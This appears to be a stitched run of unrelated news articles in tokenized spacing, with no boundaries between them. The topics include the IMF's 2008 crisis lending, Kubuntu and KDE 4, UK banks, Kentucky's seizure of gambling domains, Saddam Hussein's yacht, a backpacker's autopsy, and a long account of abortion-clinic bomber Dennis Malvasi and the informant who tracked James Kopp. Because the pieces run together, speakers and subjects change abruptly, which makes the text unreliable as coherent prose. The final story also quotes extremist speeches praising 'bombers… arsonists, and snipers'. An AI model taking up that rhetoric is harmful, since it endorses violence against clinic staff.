Questo non deve preoccupare perchè gli americani si riconoscono sempre e comunque nel loro Presidente nei momenti difficili , anche se non l’hanno votato .
E ora al lavoro .
“ Ragazzi , complimenti a tutti .
È la cosa più bella capitata a questo mondo dal 1989 . ”

WASHINGTON ( Reuters ) - The International Monetary Fund said on Thursday it was ready to lend to countries hit by the global credit crunch and had activated an emergency financing mechanism first used in the 1990s Asian crisis .
The Fund already sent a mission to Iceland , where the government has seized control of its largest bank , and has warned that the worst financial crisis since the 1930s Great Depression could inflict lasting economic harm on the world .
“ Yesterday I activated emergency procedures of the IMF to respond quickly , ” IMF Managing Director Dominique Strauss - Kahn told a news conference .
“ We are ready to answer any demand by countries facing problems , ” he said , adding that no country is immune from the crisis .
The IMF chief said the IMF was willing to provide financial assistance not only to emerging and developing nations , but also to Western countries .
“ Nobody knows if some ... advanced economies will not also be in need of some help by the IMF , ” he said , adding that countries needing to borrow will face more streamlined conditionality than normal and funding will be made available quickly .
“ Very quickly means two weeks at most , ” he added .
After several years of no major crises in emerging economies , the move puts the IMF ’s board of member countries and staff on alert that the Fund will have to respond quickly if a country needs financial help .
It also puts the global financial firefighter more at the forefront of the current financial crisis following months of being on the sidelines .
Panic over toxic , illiquid U.S. mortgage loans has sapped confidence in financial institutions , forced governments to pledge hundreds of billions of dollars of taxpayer money and pushed Western and other central banks to deliver their first coordinated interest rate cut .
Speaking ahead of IMF and World Bank meetings of world finance leaders in Washington this weekend , Strauss - Kahn said the main task for policy - makers was to restore confidence and calm global markets .
Group of Seven finance ministers and central bank chiefs also meet in Washington on Friday to consider their options .
The IMF ’s emergency facility was created in 1995 as a way of speeding up the approval of loans to countries in peril .
It was first used in 1997 to help the Philippines , Thailand , Indonesia and South Korea end crushing runs on their currencies during the Asian financial crisis .
The IMF , which played a central role in the bailouts of countries in Asia and Latin America in the 1990s , relied on lending to fund its operations .
But with fewer crises over the years , it had faced a growing income deficit , prompting an agreement in April to sell some of its gold stocks and invest profits in government and corporate bonds .
The IMF has about $ 200 billion ( 117 billion pounds ) immediately available to lend to countries in need but can tap other sources .
This is small compared to the trillions of dollars central banks and governments have poured into the financial system over the past few weeks .
UNDER PRESSURE
Emerging markets are under pressure again after strains in the United States and Europe spread .
Investors are fleeing their securities for safer assets , foreign banks are cutting lending and the countries ’ exporters are braced for weaker demand from Western consumers .
Strauss - Kahn renewed calls for more coordinated steps to calm panicky markets beyond the unprecedented simultaneous action of central banks on Wednesday to cut interest rates .

He said the global economy was on the cusp of recession but with quick and forceful action , the spreading crisis could be contained .
“ All kinds of cooperation has to be recommended .
All lonely acts have to be avoided , if not condemned , ” he said .
His calls for more coordination were backed by World Bank President Robert Zoellick who said he hoped a meeting of Group of Seven industrial nations on Friday will indicate they “ are getting ahead of the curve . ”
He said while countries will take different actions , tailored for their own circumstances , they should coordinate beyond just the G7 members to target the same basic problems .
“ The actions need to be coherent and reinforcing , ” he said , referring to Wednesday ’s simultaneous rate cut by central banks .
Kubuntu Moves Forward : You Can't Please Everyone , All the Time
by Ostatic Staff - Nov. 20 , 2008
It 's nearly a year since KDE released the KDE4 desktop .
The initial roll - out was rocky for KDE , and while subsequent releases have brought ever increasing stability and enhancements , some KDE users feel it 's not quite ready for daily use .
In the beginning the solution -- for the KDE project , and for distributions that ship with KDE , such as Kubuntu -- was fairly simple .
Offer both the 3.5.x and 4.x versions , either as a installation option , or through repositories .
At some point , however , a disconnect has to come .
Celeste Lyn Paul , a member of the KDE Human - Computer Interaction group , talks a bit about the decisions Kubuntu had to face as Hardy ( and its 3.5 desktop option ) gave way to Intrepid 's 4.1.x only environment .
It 's an unenviable position , both for KDE and the distributions that focus on it as the primary desktop .
The differences between earlier KDE releases and the 4.0 release were so significant that the user interface ( re -) learning curve understandably required more time .
And as Paul states , the 4.0 release was more bleeding edge than usual .
This meant that developers also had their own learning curve of sorts , and as each new tweak was applied , end users had at least minor adjustments to absorb .
Paul makes the observation , however , that KDE by nature has always been a bit more focused on " functional design " oriented early adopters -- as she puts it , a release does n't have to be still " breathing and bleeding " but should be a fresh kill .
A distribution ( indeed , any application ) has an obligation to its users , especially in the transitional state that KDE was in when Hardy was released last spring .
This is why , Paul says , Hardy offered both desktop versions through officially supported packages .
When Intrepid was released in October , the Kubuntu team had to make the call -- and decided it was time to move forward .
The KDE 3.5 desktop is n't disappearing tomorrow , but it is n't the future of the desktop environment anymore , either .
Unfortunately , according to Paul , Kubuntu decided to disable a few functions of the KDE 4.1.2 desktop in Intrepid because of some worrisome bugs .
This aggravated some Kubuntu users .
Other Kubuntu users , though , had to come to terms with the fact that the older desktop release was only available through untrusted , third party sources .
They either had to make the transition , or take their chances with packages that potentially could ( and in some cases , did ) damage their new Intrepid installations .
As someone who was annoyed with the initial KDE 4 rollout ( I had been fooling with the 4.0 release since the alpha stages , which were n't as pretty , but seemed more stable than the January release ) , I 've come to make peace with the eccentricities and appreciate the enhancements in the latest releases .
However , I empathize with both sides .
Change often is good , but changes should help get things done -- and there are a lot of different opinions on what changes help , hurt , or are merely annoying ( and how positive or detrimental they are overall ) in any desktop setting .
I also feel that the Kubuntu team has done -- and are doing -- what needs to be done to keep the distribution up to date , and to move both Kubuntu and KDE 4 forward .
The team 's decision wo n't make every user happy , but packaging both desktop versions ( and maintaining every associated package and dependency required for system stability ) would be a drain on human resources no project can afford .
Banks will today be warned that the government may take the " nuclear option " and force them into full - scale nationalisation if they fail to resume lending to businesses .
In a strongly worded statement , John McFall , the chairman of the Commons treasury select committee , said banks should be " actively lending instead of sitting on their hands " .
" Governments on both sides of the Atlantic have called on them to resume lending , and criticism has been directed to the banks that they are not shaping up to the task at hand , " he said .
" If the banks do not play ball , and will not resume lending , then the demand for full - scale nationalisation may well grow . "
McFall said the strategy had proved successful in Norway , Sweden and Finland between 1991 and 1993 .
" With major banks under public control , the governments would be in a position to instruct them to raise their levels of lending . "
The West Dunbartonshire MP said that despite having been " pulled back from the brink " of collapse with a cash injection of £ 37bn from taxpayers , banks were " reluctant to launch their sizeable recapitalisation lifeboat and start lending again to households and businesses " .
He said : " There are 4.7 million small and medium size businesses in the UK , employing 13.5 million people – almost 60 % of the private - sector workforce .
These are very large numbers .
They need loans to help them sustain these important jobs . "
In the current crisis , banks should not be hoarding capital but should be able to utilise their reserves to ensure that money is available for lending , McFall said .
There was a clear incentive for them to do this : " the £ 37bn funding to be provided by the Treasury is expensive , costing the banks 12 % per year " .
He said : " Banks may be diverting much of their income towards repaying this aid , rather than expanding their loan books .
In my view , this must stop : banks may have to get used to the idea of being part - nationalised for a longer time .
" If they do n't then one answer would be for the state to step in again and guarantee mortgages and other retail loans
If the perception gains hold that the banks are continuing to refuse to lend , then a website should be set up for small and medium businesses to report the fact that they have been refused a loan and record their dismay about the way they have been treated . "
In September , the state of Kentucky won a legal victory in its fight to control gambling within its borders , as a judge ordered the seizure of the domain name registrations of a variety of online gambling outfits .
Although the ruling targeted 141 sites , the legal challenge has been accepted by two of the businesses targeted , which have filed an appeal in the case .
Their appeal has now been joined by the Electronic Frontier Foundation , ACLU , and the Center for Democracy and Technology , who use an amicus brief to argue that the initial seizure ruling was flawed on several levels .
Kentucky has fairly strict laws regulating gambling ; wagering is legal , but only on the state 's terms .
To an extent , its attempts to go after online gambling outfits represent an attempt to push more people into using its legally sanctioned ( and tax - generating ) gambling facilities ( remember , this is the home of the Kentucky Derby ) .
The goal of this legal action is simply to prevent the state 's residents from patronizing online alternatives .
But , as noted in the amicus brief , the route it has taken to get there has left it running afoul of no end of legal problems .
The brief lays out a series of arguments , the most interesting of them first .
We 'll go through them in reverse order .
The first is simply that the registrars that handle the domains are n't operated in Kentucky , and the state has not demonstrated that it has jurisdiction over them — in fact , the amicus brief claims it cannot possibly demonstrate that it does .
So , there 's no way for it to compel them to do anything in this case .
More significant is that the ruling being appealed would allow Kentucky to effectively control commerce in other states and nations , leaving it on the wrong side of the Constitution .
" Under the Commerce Clause , " the authors state , " it is simply not permissible for Kentucky to prohibit access by residents of Las Vegas , for example , to access a site that is lawful in Nevada . "
Beyond the Constitution , the seizure is also likely to cause problems at the World Trade Organization , where the US stance on online gambling has already come under fire .
The brief also raises the ominous prospect that regimes that limit free speech will latch onto the example and start seizing the domains of any website that offends them .
The ruling gave the sites the alternative of using geographic filters to block access by Kentucky residents , but that is likely to cause problems with the patchwork of state and international laws that determine what 's legal in what location .
Not only would it shift the burden and cost of enforcing , say , the Great Firewall of China onto individual content providers , but geographic filtering simply does n't work .
The brief cites the limited accuracy of existing services , which could easily place residents of neighboring states on the wrong side of the filter , as well as anonymizing services like Tor and Anonymize.com .
The brief also claims that the decision would , " chill speech of all types . "
Even an online gambling site is likely to have legally protected content hosted within its domain ; the seizure of the domain would limit access to that content as well .
The legal reasoning behind the seizures appears to have few limits .
" Under the court 's theory , " it reads , " Kentucky would be able to seize any domain name , from anywhere in the world , that pointed to a website that Kentucky deemed to violate local law . "
The authors go on to list a variety of reasons that this decision is overly broad and unconstitutional .
The court decision seems to have been flawed on a number of levels , but the groups that filed the amicus brief focused on the free speech issues .
" If the Kentucky order is upheld , no speech that conflicts with any law , anywhere in the world , would be safe from censorship , " stated the CDT 's John Morris .
" Just as Kentucky is trying to take down sites located around the world , any government seeking to stifle free expression could try to interfere with lawful speech hosted in the United States . "

The yacht could fetch offers in the region of $ 35 m
The Iraqi government is to sell a luxury yacht which was previously owned by the late leader , Saddam Hussein .
The 82 m ( 270 ft ) Ocean Breeze is equipped with swimming pools , an operating theatre , a helipad and an escape tunnel leading to a submarine .
Iraq has decided to sell the yacht after winning a legal battle with a Jordanian company over its ownership .
The yacht is expected to sell for millions of dollars , but brokers have said the decor may not suit all tastes .
It has been decorated in what has been described as " Arabesque " style , with mahogany carvings , gold tap fittings and brightly - coloured deep - pile carpets .
The ship , originally called Qadissiyet Saddam after a historic Iraqi military victory , was built in a Danish shipyard in 1981 by workers sworn to secrecy .
But , despite its luxurious facilities , Saddam Hussein is never thought to have stayed on board himself , fearing political instability if he left Iraq .
So for most of its life , Ocean Breeze was moored in Saudi Arabia - until last year , when it arrived in the French port of Nice and remained there while its ownership was determined .
A Cayman Islands firm , part - owned by King Abdullah of Jordan , had claimed that Saddam had given the yacht to them , but a French court ruled last summer that it should be returned to the Iraqi government .
Government spokesman Ali al - Dabbagh said the ministries of finance and foreign affairs would be responsible for the sale .
Brokers have suggested that in the current financial climate , it could be difficult to sell a vessel which is luxurious but not up to the standards of more modern yachts - it does not , for example , have a gym and boasts only one helipad .
However , offers are expected in the region of $ 35 m ( £ 18 m ) , and one broker suggested the yacht 's history could be " a good selling point " .

Britt Lapthorne 's family will seek independent tests on her body by the Victorian coroner after a Croatian autopsy report gave no insight into how the Australian backpacker died .
Ms Lapthorne 's father Dale said a brief autopsy report released in Dubrovnik today described the condition of his daughter 's body , but was inconclusive on the cause of death .
" There is no visible sign of an act of death because the body is in such a poor condition , " Mr Lapthorne said .
" There is nothing in the report from the translation made to us that indicates accidental death or death by other means , they cannot determine . "
Police announced on Friday that DNA tests had confirmed a body found off the coast of Dubrovnik on October 6 was that of the 21 - year - old Melbourne student .
She had gone missing 18 days earlier .
Ms Lapthorne 's body has been released to her family , who plan to bring her back to Australia this week .
" The arrangements are being made to go to a funeral director , " Mr Lapthorne said .
" The body will not be preserved as would normally be the case because they are aware that further pathological tests will be undertaken by the Victorian coroner .
" The body will be picked up by the Victorian coroner at the airport .
" I have been assured that any investigation carried out by the coroner 's department in Victoria will be a very thorough scientific investigation at very high level .
" They said if your imagination is CSI that 's what the Victorian coroner 's office is like , " Mr Lapthorne said .
Croatian police were expected to hold a press conference at 2 pm local time ( 2300 AEDT ) .
" The principal objective was to take her home alive , " said Mr Lapthorne .
" We did not do that ... at least we have the consolation that we can take her home . "
Mr Lapthorne and son Darren travelled to Dubrovnik to find Ms Lapthorne after she disappeared .
Ms Lapthorne 's mother Elke has stayed in Melbourne .
The family believe Britt is the victim of foul play and reject any suggestion she jumped or fell off the cliff above the cove where the body was found .

Dennis Malvasi was the kind of kid everyone else wanted to be — the funny one , the street - smart one , the handsome one with a natural swagger .
The Brooklyn neighborhood he grew up in was one of the worst slums in the city ; East New York in the mid-sixties was a gangland , perpetually on the brink of a race riot .
But Dennis always seemed above it all , despite being worse off than most .
He had eleven brothers and sisters , with three fathers between them .
His mother was so poor she sent him for a time to an orphanage upstate .
Maybe it was knowing so many unwanted children that explains what happened later .
Dennis entered the Vietnam War just after the Tet Offensive .
He was 17 but so eager to enlist that he found a stranger in the street to sign his parental - consent form .
He served one tour as a field radio operator , drawing VC fire on a number of occasions , then turned around and re-upped for a second .
As a soldier , “ I felt really alive , really wanted , ” is how Dennis put it .
Life at home was harder .
He was arrested for being in a street fight — “ hanging around , ” he ’d later say , “ with some very dangerous people . ”
He tried to become an actor , joining an Off– Off Broadway troupe on the Lower East Side , even winning some acclaim .
But in 1975 , he got stopped and frisked by a police officer on a subway platform .
He was carrying a . 25 - caliber pistol .
It was his second felony .
He was sent upstate to prison for two years .
Dennis could n’t get over the idea that he was behind bars while draft evaders received clemency .
His anguished letters from jail were dated with the years he served in Vietnam , as if to will himself back in time .
Some time after he got out , he became secretive — taking messages from a beeper , having his mail delivered to bars , getting jobs and a driver ’s license under assumed names .
He missed being in action and got licensed as a pyrotechnics expert to work with explosives .
Then he started spending time with a group called Our Lady of the Roses , a Catholic fringe group that raged on about the evils of Vatican II and the sinfulness of modern life .
The foulest of sacrileges , they believed , was abortion .
Dennis was n’t a churchgoing Catholic , but he ’d never believed in abortion .
“ Here ’s the truth .
Look .
This is a life , ” he once said , pointing to a picture of a fetus in a training book for paramedics .
Now he complained to one friend about how he ’d defended his country and was called a baby - killer while others were murdering the unborn with impunity .
On December 10 , 1985 , a small pipe bomb ignited inside a vacant men ’s room at the Manhattan Women ’s Medical Center on East 23rd Street .
Eleven months later , another homemade explosive , this one with a half - stick of dynamite , blew a hole through the wall of the Eastern Women ’s Center on 30th Street .
Two weeks after that , police found an unexploded bomb with three sticks of dynamite inside a sofa at a clinic on Queens Boulevard .
Finally , on December 14 , 1986 , the bomb squad burst into the smoke - filled Second Avenue headquarters of Planned Parenthood to find a carpet fire started by a small incendiary device , not far from a larger bomb with fifteen sticks of dynamite , enough to destroy the front of the building had it not been defused in time .
The attack had the hallmarks of a highly motivated professional : blasting caps , timers , batteries , and a Catholic medal of St. Benedict .
Dennis Malvasi was New York City ’s first abortion - clinic bomber .
Joseph had come to Brooklyn with his family in the sixties when he was 14 years old .
His parents were shtetl Jews who had stayed in Poland during the war , fighting the Nazis , only to leave in 1960 when some kids went after Joseph with a straight razor , claiming that his parents had killed Christ .
His family found a tenement in the only slightly less dangerous neighborhood of East New York .
His father worked as a leather cutter , his mother as a seamstress .
Joseph was prone to fainting spells and panic attacks , and had to learn to speak English without a lisp .
Even his friends called him the Trembler .
He tried playing the clown but was too cloying and needy .
“ I was the water boy , ” Joseph remembers .
“ I was in the background . ”
Joseph , whose identity has been protected here for reasons that will become clear , ca n’t remember when he first met Dennis .
It was 1964 or ’ 65 , out on the street , playing skelly or picking up girls .
He remembers Dennis as very friendly and very poor .
“ We hung out , but it was , ‘ Hi , how ’re you doing ? ’
We did n’t develop a closeness . ”
Within a few years , Dennis had enlisted and Joseph had been drafted , and the two lost touch .
As a noncitizen , Joseph served Stateside , then spent the seventies leading a small , dead - end sort of life .
He was a process server for the courts , a collection agent , a driver , and , finally , a counselor to veterans for the State Department of Labor .
It was there , in 1985 , that Joseph got a call from a friend , asking if he would look after a down - on - his - luck Vietnam veteran from the old neighborhood named Dennis Malvasi .

They met again on a sunny afternoon at a pretzel stand outside Saint Patrick ’s Cathedral .
Within minutes they found they knew a lot of the same people , and Joseph was enthralled .
Here was someone from the old days who ’d gone on to become a war hero , someone who made him feel like a big shot just by knowing him .
“ It was the same old Dennis , ” Joseph remembers .
“ Easygoing : ‘ Everything ’s going to be all right . ’
A sweetheart .
He stood up for this country and the war .
I looked up to him — respected him for doing it . ”
Dennis spent the early weeks of 1987 hiding from the police — and laughing over the phone ( though not with Joseph ) about what a bad job the cops were doing finding him .
The manhunt might have gone on longer if Cardinal O’Connor had n’t appeared on the news in late February , delivering a plea for Dennis , who was publicly identified as the main suspect , to give himself up .
The next day , Dennis , wearing an eyepatch and sunglasses , walked unnoticed into the Church Street headquarters of the Bureau of Alcohol , Tobacco , and Firearms .
“ It ’s hard to turn down the cardinal , ” he said .
Then he asked for a lawyer .
Dennis pleaded guilty to two of the attacks , and the other two charges were dropped ; largely because no one had been seriously hurt , he was sentenced to just seven years .
Behind bars , he grew more defiant .
“ History will show that abortion in New York State was nothing more than the dissipation of the black and Puerto Rican populace , ” Dennis said in his one jailhouse interview .
One day in 1992 , Joseph got a call from someone he and Dennis both knew .
The two men had n’t been in touch since the conviction .
“ Dennis is coming out , ” their friend said .
“ Take him in . ”
They made a point of never talking about what Dennis had done .
“ We made a pact , ” Joseph remembers .
“ I said , ‘ Look , do n’t drag me into your world .
What you have done in the past , it ’s history . ’
He promised me , ‘ Yes , ’ and that ’s it .
I took his word for it .
But Dennis had two different lives . ”
So , eventually , would Joseph .
Joseph remembers the first few months after Dennis got out as an idyll .
They lived near each other in Brooklyn again , goofing off like they were kids .
Joseph bought Dennis a used Oldsmobile , co-signed for his credit card , helped him find odd jobs .
Taking care of Dennis made Joseph feel like the important one .
They chased women , too — until one day Dennis dropped by Joseph ’s place with a woman dressed in a simple long skirt , like a Mennonite .
She seemed about 30 , a decade younger than Dennis , and was plain - looking , with long dark hair and dark skin , and green eyes .
“ This is Rose , ” Dennis said .
“ She ’s gonna be my wife . ”
Rose was the nickname of Loretta Marra .
Loretta was the closest thing the radical pro-life movement had to Joan of Arc : a compelling , innocent - seeming young woman speaking out against the evils of abortion .
She was born into the movement .
Her father was a Fordham philosophy professor named William Marra who ran as a third - party right - to - life candidate for president in 1988 .
From an early age , she began speaking at demonstrations and chaining herself to other protesters outside clinics in America and Europe .
Her good friend and perhaps closest spiritual ally in the abortion war was a man named James Charles Kopp .
A biology graduate student from Pasadena , California , who abandoned his career to devote his life to saving the unborn , Kopp had been a regular at clinic protests throughout the eighties .
He went to work for Randall Terry , who founded Operation Rescue , and crossed paths with Michael Bray , a central figure in the Army of God .
His first major contribution to the cause was the invention of handmade , Kryptonite - lock - style shackles that could block clinic entrances for hours .
He met Loretta ’s father at a protest in Florida in the summer of 1986 , when she was just 23 .
Friends said Kopp and Loretta were instant soul mates , almost finishing each other ’s thoughts .
Some say Kopp was in love with her .
Loretta and Dennis were married in 1994 .
Two years later , Loretta delivered a baby boy named Louis .
A second son — James — was born in April 1999 .
The couple lived secretly , Joseph says , using fake driver ’s licenses , dodging Dennis ’s probation officer , keeping anyone from seeing the inside of their apartment .
According to Joseph , Loretta once persuaded Dennis to quit a job after she noticed that one of the company ’s contracts was with a hospital that performed abortions .
Joseph did n’t know until years later that their wedding had never been recorded with the state and that Loretta had delivered both her boys in Canada .
And he did n’t know that even after Loretta and Dennis got married , Loretta had kept in touch with her friend James Kopp .

Sometime in 1998 , Dennis came to Joseph ’s apartment carrying a large sack .
Joseph looked inside .
It was a rifle .
“ What the fuck ?!
Are you for real ? ”
“ I ’ve gotta store it , ” Dennis said , “ for a friend . ”
The nation ’s most notorious abortion - related murder had taken patience .
James Kopp visited the woods behind the house on the outskirts of Buffalo for days — wrapping his Russian - made SKS in vinyl and stowing it in a tube he ’d planted in the ground , then covering the tube with leaves until he came back , waiting for the right moment .
Finally , at 9:55 p.m. on Friday , October 23 , 1998 , Kopp got the shot he wanted .
The abortion doctor was standing in the kitchen , microwaving a bowl of soup .
Kopp pulled the trigger .
The bullet shattered a window and hit the doctor in the back .
“ I think I ’ve been shot , ” Barnett Slepian said .
“ Do n’t be ridiculous , ” said his wife , Lynne .
He bled to death before he could get to the hospital .
Slepian ’s death instantly galvanized the abortion debate : Pro-choice supporters cried out for justice ; militant pro-life advocates proclaimed that justice had been done .
Bill Clinton called the killing a “ tragic and brutal act . ”
The Justice Department launched an international manhunt for the sniper .
But Kopp had a carefully thought - out getaway plan .
He dyed his hair blond to match a fake driver ’s license , and a friend drove him to the Mexican border .
Within weeks , he flew to London undetected ; from there he ’d move on to Ireland .
But Kopp had one stroke of bad luck .
A woman who lived near the Slepians told the police about a man she ’d seen while jogging who had seemed out of place .
She ’d even written down his car ’s license - plate number .
On November 4 , a material - witness warrant was issued for James Kopp , with a $ 500,000 reward offered for information ; by the time Kopp was indicted , the reward had been raised to $ 1 million .
FBI agents raced to search all the places he had lived over the years and to interview friends .
Near the top of their list was Loretta Marra .
They found her pager number in the phone records of another friend of Kopp ’s but still could n’t locate her .
They went to her father ’s funeral in December , but she did n’t show up .
Their best move , they decided , was to somehow get to Dennis Malvasi .
In the spring of 1999 , Joseph says he was in the parking lot of a shopping center on Ralph Avenue when a van rolled up next to him and stopped .
The van door slid open .
“ We want to talk to you . ”
“ Forget it , ” he said , and kept walking .
Joseph knew Dennis was still on parole .
He figured this must be about him .
So he told him about the van a few days later .
“ I was followed , ” he said .
“ You better watch it . ” Dennis smiled cryptically and thanked him .
A few weeks passed , then it happened again — this time an SUV pulled up beside Joseph while he was parking his car .
“ Can we talk now ?
It does n’t have to be here .
We do n’t expect you to trust us . ”
“ No , ” Joseph said .
“ I do n’t want to get involved ” — though he had no idea what Dennis might have done .
In mid-September , Joseph was hanging out in Marine Park , making conversation with a plainclothes detective he knew named Julio .
“ There was a killing in Buffalo , ” Julio said .
“ Yeah ? ” said Joseph .
Julio told Joseph that the victim had been an abortion doctor .
Joseph ’s mind flooded .
Dennis .
Days later , on September 27 , 1999 , Joseph found himself sitting in the back of an SUV with tinted windows parked at a Toys ’ R’ Us near the Kings Plaza mall on Flatbush Avenue .
Julio was there , to make him feel comfortable .
And in the driver ’s seat was a man in a dark suit .
The man was smiling .
“ How , ” asked the man , “ would you like to have $ 1 million in your pocket ? ”
A few days later , face - to - face with FBI agents in an airless downtown hotel room , Joseph panicked .
He started making demands , insisting that no one call him by his real name .
He even made up a pseudonym on the fly : Jack , from a framed poster he saw on the wall , Steele , from Remington Steele .
He still was n’t ready to cooperate , but the agents kept pursuing him , asking to meet again and again , and in October , a new agent called .
“ Would you give me a try ? ” asked Michael Osborn of the New York office .
Osborn told Joseph that all he wanted to know was what Loretta and Dennis knew about the case .
He was respectful ; he even called him Jack Steele .
Joseph was running out of reasons to say no .
He knew they ’d never stop asking .
Maybe , he told himself , there was an angle here :
If Dennis was clean , no harm done ; if Dennis did happen to know who did this , he would help solve a murder and go home a millionaire .

So he said yes .
Joseph insists his decision was n’t about abortion .
It was about murder .
“ Pro-life ?
I got no problem with that .
But murdering someone ?
I got a problem with that regardless who they are . ”
Then there was the money — or as Joseph calls it , “ the incentive . ”
“ Want me to lie to you and tell you no ? ” Joseph says .
“ I ’d be lying to myself . ”
The bureau wanted to bug everything — Dennis ’s place on Chestnut Street , Joseph ’s car — so they could listen as Joseph tried to get Dennis and Loretta to reveal where Kopp was .
But until they could get warrants , Joseph would be their eyes and ears .
The agents provided Joseph with cash for entertaining Dennis and Loretta .
He was already buying them meals almost every day ; now the FBI was picking up the tab .
Joseph would tag along with Dennis to trash cans where he got rid of reams of paper so the FBI could search through them once Joseph tipped them off .
Later , Osborn suggested that Joseph give Dennis a bunch of prepaid phone cards that the FBI could trace .
In time , the FBI knew about every call Dennis and Loretta made or received .
Joseph once sat with Dennis and Loretta at his place as they watched a 60 Minutes segment about the hunt for Kopp , waiting for them to give something up .
They said nothing the agents could use .
About a month into his surveillance , the three of them were in Dennis ’s car , heading home from a Chinese buffet in Canarsie .
Loretta ’s cell rang .
She picked it up and gasped .
“ It ’s him !
It ’s him ! ”
“ Pull over , ” Dennis said .
Joseph might have guessed they were talking about Kopp , but he was n’t sure .
He tried to act uninterested .
“ Dennis , do me a favor , man .
Just drop me off . ”
That night , he called Michael Osborn and told him what had happened .
All he got were questions — what did Loretta say ?
Who was she talking to ?
They needed more .
“ How , ” asked the FBI agent , “ would you like to have $ 1 million ? ”
By the end of 1999 , Kopp had made his way from London to Dublin , calling himself Timothy Guttler , walking the streets , even hanging out in well - traveled spots like Bewleys coffee shop .
The following July , he took the name Sean O’Briain , a name he ’d seen on a local tombstone .
Kopp wanted eventually to return to Canada or America — perhaps just to be around the people he loved , perhaps to come out of what he called “ retirement . ”
Throughout his exile , he wrote letters — at times lighthearted and jokey , at times sentimental — to his friends Dennis Malvasi and Loretta Marra at 385 Chestnut Street in Brooklyn .
Joseph , meanwhile , spent the next year hinting to Dennis and Loretta that he wanted to join their cause .
Joseph would tell Michael Osborn he was going on car trips with Dennis and Loretta , and the FBI would loan him cars with bugs ; he ’d tell Dennis and Loretta his own car was in the shop .
According to FBI transcripts from Jon Wells ’s book about the Kopp case , Sniper , Joseph ( referred to in the book as a “ confidential source ” ) and Loretta were talking on one car trip about gumming the locks of clinic entrances with glue — a tactic used to stop abortions , if only for a few hours .
Joseph brought up the Slepian murder .
“ You think the shooter was trying to kill him ? ” he asked .
“ You ’re always out there to maim , ” she said .
“ What ’s Jim ’s opinion on that ? ” he asked — slipping in a mention of Kopp ’s name .
“ I know he feels bad for Slepian ’s children , ” she said .
“ But he knows Slepian was not an innocent person , either .
He was , morally , a guilty person . ”
Joseph could n’t think of a way to ask Loretta where Kopp was hiding .
Instead , he brought up Dennis ’s clinic bombings .
That was when Loretta told Joseph that she thought Dennis never should have surrendered to the cardinal .
“ In my opinion , Dennis had an obligation not to obey him , ” Loretta said .
“ O’Connor ’s request was a sinful command . ”
On another trip , Joseph remembers asking Loretta , “ Would you really have the fortitude to kill a human being ? ”
“ I think I ’d be capable of killing , ” she said , “ for God and a higher good . ”
After Joseph and Loretta came home , Osborn pushed Joseph to go inside Dennis and Loretta ’s apartment ; they ’d always made excuses whenever Joseph tried to enter .
Joseph went on a shopping spree and came over on the pretext of delivering presents .
“ They had a little room , nothing much , ” he remembers .
“ They slept on the freakin ’ floor . ”
When Loretta stepped out to a bodega , Joseph started to play with little Louis .
Joseph pointed to a picture on a shelf of James Kopp with a cross on it .
“ Who ’s this guy ? ” Joseph asked .
“ Oh , that ’s Uncle Jim , ” said Louis .
“ You saw him ? ”
“ Yeah . ”
“ Where ? ”
“ In our old house , ” Joseph remembers the boy saying .
He meant the place his parents had moved from on Linden Boulevard .
“ He came up to see us once . ”
On the Friday night after one car trip , Loretta picked up Joseph at his apartment for his first clinic action .
Joseph was married now , and he told his wife , Rachel , that he was going out to play cards .
When he opened Loretta ’s car door , he saw she was wearing fatigues .
She ’d gone to three different stores to buy toothpicks , glue , and a dark cap for Joseph .
They drove across Brooklyn to a doctor ’s office on Church Avenue that they had cased during the day .
Loretta parked .
In Joseph ’s hand was a toothpick dripping with glue .
He opened the car door , and walked out into the rain .
When he got to the clinic , Joseph picked up his cell phone and called Osborn .
“ Michael , ” said Joseph , “ I have a toothpick .
I have Krazy Glue .
I ’m gluing it . ”
“ You ’re not gonna glue it , ” the agent said .
“ Michael , I do n’t know what I ’m gonna do . ”
“ You ’re not gluing it .
You ’re breaking the law . ”
Joseph laughed .
“ Come on ! ” he said .
“ A little wo n’t hurt . ”
A pause .
Then Joseph reassured him .
“ Michael , I ’m dropping the glue . ”
Some glue dripped on Joseph ’s fanny pack .
A happy accident ; now he ’d have something to show Loretta .
“ Look at this ! ” he said , back in the car .
“ It ’s all over me ! ”
Loretta could n’t contain herself .
She called Dennis .
“ Dennis , we did it , we did it ! ”
All the way home and through the next day , it was all she could talk about .
Kopp started making plans to leave Ireland toward the end of 2000 , perhaps for Germany .
He was issued an Irish passport under the name John O’Brien in November , and applied for a driver ’s license under the name Daniel Joseph O’Sullivan in December .
But to travel , Kopp needed money , and Dennis and Loretta happened on a way to raise some .
In January 2001 , Dennis and Loretta drove south on the New Jersey Turnpike to attend the annual White Rose Banquet in Bowie , Maryland — the ultimate radical pro-life trade show .
Created by Army of God ’s Michael Bray to mark the anniversary of Roe v. Wade , the White Rose featured speakers paying tribute to people jailed for attacking abortion clinics .
( The name White Rose was borrowed from a group of German resisters to the Nazis . )
Dennis , an A - list celebrity in this circle ever since the New York clinic bombings , agreed to be one of that year ’s honorees .
To raise money , he would auction off a wristwatch he ’d used as a timing device in his attacks .
Dennis and Loretta invited Joseph to come with them on the trip .
Milling around the banquet room , Joseph got his first look at the stars of the pro-life movement .
There was Donald Spitz from Army of God , who called Barnett Slepian a “ serial murderer ” and his assassin a “ hero . ”
There was Chuck Spingola , who wrote , “ I believe James Kopp was serving Jesus the righteous , if and when he killed the baby - butcher Slepian , ending his abhorrent and satanic lust for innocent blood . ”
And there was the Reverend Matt Trewhella , founder of Missionaries to the Pre-Born , who once said , “ This Christmas , I want you to do the most loving thing .
I want you to buy each of your children an SKS rifle and 500 rounds of ammunition . ”
Joseph remembers watching the banquet room fill up with women in long skirts , men in ties and jackets , and children — “ little blonde girls , 11 , 12 years old .
You could hear the kids preaching hate against the animals who killed babies . ”
Then came the speeches .
“ They were preaching hate to faggots , ” Joseph says .
Later , Bray and Spitz brought up the Jews — Dennis shot Joseph a look .
“ Do n’t say a fucking word , ” he said .
Joseph was silent .
Loretta never set foot inside the hall .
There was media there , so she stayed away , afraid of being recognized .
She did , however , help write Dennis ’s keynote speech in the car on the way down .
“ One favorite [ saying ] is , ‘ Violence never solves anything , ’ ” he told the crowd .
“ Of course it does .
It solves all kinds of problems .
And just men have used it as a tool throughout history . ”
Dennis ended by saluting “ the noble work of supporting your local baby - defender , from lock - gluers to bombers … arsonists , and snipers .
Your help makes all the difference in the world — to the babies themselves . ”
On the way home , Joseph decided to push a little harder .
He talked with Dennis about what it might take to meet the man who killed Barnett Slepian .
Dennis looked at Joseph .
“ Maybe , ” Dennis said .
